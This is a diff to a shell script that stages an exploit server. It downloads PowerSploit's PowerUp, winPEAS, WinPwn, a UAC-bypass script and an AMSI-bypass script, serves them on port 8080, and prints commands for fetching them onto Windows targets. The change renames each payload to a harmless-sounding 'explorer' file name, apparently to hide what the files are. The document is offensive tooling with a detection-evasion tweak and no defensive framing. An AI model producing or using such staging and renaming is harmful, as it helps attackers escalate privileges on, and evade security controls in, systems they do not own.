@@ -30,11 +30,11 @@ download_script() {
 }
 
 # Download required scripts
-download_script "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" "/tmp/exploit_server/powerup.ps1"
-download_script "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1" "/tmp/exploit_server/winpeas.ps1"
-download_script "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1" "/tmp/exploit_server/winpwn.ps1"
-download_script "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/uac-bypass.ps1" "/tmp/exploit_server/uac-bypass.ps1"
-download_script "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1" "/tmp/exploit_server/amsi-bypass.ps1"
+download_script "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" "/tmp/exploit_server/pu-explorer.ps1"
+download_script "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1" "/tmp/exploit_server/wp-explorer.ps1"
+download_script "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1" "/tmp/exploit_server/pn-explorer.ps1"
+download_script "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/uac-bypass.ps1" "/tmp/exploit_server/uac-explorer.ps1"
+download_script "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1" "/tmp/exploit_server/amsi-explorer.ps1"
 
 chmod 755 -R /tmp/exploit_server
 
@@ -60,7 +60,7 @@ print_command() {
 echo "PowerShell Bypass Commands:"
 echo "============================"
 
-for script in powerup.ps1 winpeas.ps1 winpwn.ps1 uac-bypass.ps1 amsi-bypass.ps1.; do
+for script in pu-explorer.ps1 wp-explorer.ps1 pn-explorer.ps1 uac-explorer.ps1 amsi-explorer.ps1.; do
     url="http://$IP:8080/$script"
     echo "Commands for $script:"
     echo "--------------------"
